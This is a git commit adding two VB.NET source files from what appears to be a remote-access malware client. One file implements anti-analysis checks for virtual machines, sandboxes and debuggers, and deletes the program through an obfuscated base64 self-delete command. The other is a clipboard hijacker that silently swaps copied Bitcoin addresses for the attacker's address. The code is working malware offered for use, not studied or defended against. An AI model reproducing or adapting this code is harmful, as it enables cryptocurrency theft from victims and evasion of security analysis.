620168726e50602d6759bae2d11b9c24cd67c982
PyterSmithDarkGhost <106814901+PyterSmithDarkGhost@users.noreply.github.com>
2022-06-26 05:19:29 -0300

    Add files via upload

---
+++ Project/Client/C_AntiVM.vb
@@ -0,0 +1,58 @@
+﻿Namespace Lime
+
+    Public Class C_AntiVM
+
+        <Runtime.InteropServices.DllImport("kernel32.dll")>
+        Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
+        End Function
+
+        Public Shared Sub Check() 'https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/
+            Try
+                If DetectVirtualMachine() Then
+                    GoTo del
+
+                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
+                    GoTo del
+
+                ElseIf LoadLibrary("SbieDll.dll") = True Then
+                    GoTo del
+
+                ElseIf Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
+                    GoTo del
+
+                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
+                    GoTo del
+
+                End If
+                Exit Sub
+del:
+                'cmd.exe /c ping 0 -n 2 & del 
+                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
+                End
+
+            Catch ex As Exception
+            End Try
+
+        End Sub
+
+        Private Shared Function DetectVirtualMachine() As Boolean
+            Try
+                Using searcher = New Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem")
+                    Using items = searcher.[Get]()
+
+                        For Each item In items
+                            Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
+
+                            If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
+                                Return True
+                            End If
+                        Next
+                    End Using
+                End Using
+            Catch ex As Exception
+            End Try
+            Return False
+        End Function
+    End Class
+
+End Namespace
---
+++ Project/Client/C_BTC.vb
@@ -0,0 +1,28 @@
+﻿Namespace Lime
+
+    Public Class C_BTC
+        Public Shared Sub _BTC_ST()
+            Dim Clipboard As String = ""
+            While True
+                Try
+                    'the address always start with 1 or 3 or bc1
+                    'the length is between 26-35 characters
+                    'more info https://en.bitcoin.it/wiki/Address
+                    Clipboard = My.Computer.Clipboard.GetText
+                    If (Clipboard <> C_Settings.BTC_ADDR) Then
+                        If Clipboard.Length >= 26 AndAlso Clipboard.Length <= 35 Then
+                            If Clipboard.StartsWith("1") OrElse Clipboard.StartsWith("3") OrElse Clipboard.StartsWith("bc1") Then
+                                Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf My.Computer.Clipboard.SetText)
+                                _BTC.SetApartmentState(Threading.ApartmentState.STA)
+                                _BTC.Start(C_Settings.BTC_ADDR)
+                            End If
+                        End If
+                    End If
+                    Threading.Thread.Sleep(50)
+                Catch ex As Exception
+                    '  C_Main.C.Send("MSG" + C_Main.SPL + "BTC Error! " + ex.Message)
+                End Try
+            End While
+        End Sub
+    End Class
+End Namespace
